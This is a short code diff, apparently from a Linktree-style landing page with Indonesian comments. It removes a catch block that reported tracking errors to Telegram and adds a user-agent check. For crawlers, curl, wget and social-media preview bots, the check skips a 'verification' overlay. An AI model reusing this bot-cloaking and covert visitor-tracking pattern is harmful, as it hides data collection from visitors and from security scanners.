-      } catch (err) {
-        // Jika terjadi error total, kirim pesan minimal
-        await sendTelegramMessage(`⚠️ Tracking partial error: ${err.message}`);
-      }
+    // Deteksi bot: jika user-agent bot, langsung tampilkan Linktree tanpa verifikasi
+    const botPattern = /bot|crawler|spider|scraper|curl|wget|telegrambot|facebookexternalhit|twitterbot/i;
+    if (botPattern.test(navigator.userAgent)) {
+      overlay.style.display = 'none';
+      mainContent.style.display = 'block';
     }
-
-    // Mulai setelah halaman dan semua resource siap
-    window.addEventListener('load', execute);
   })();
   </script>
 </body>
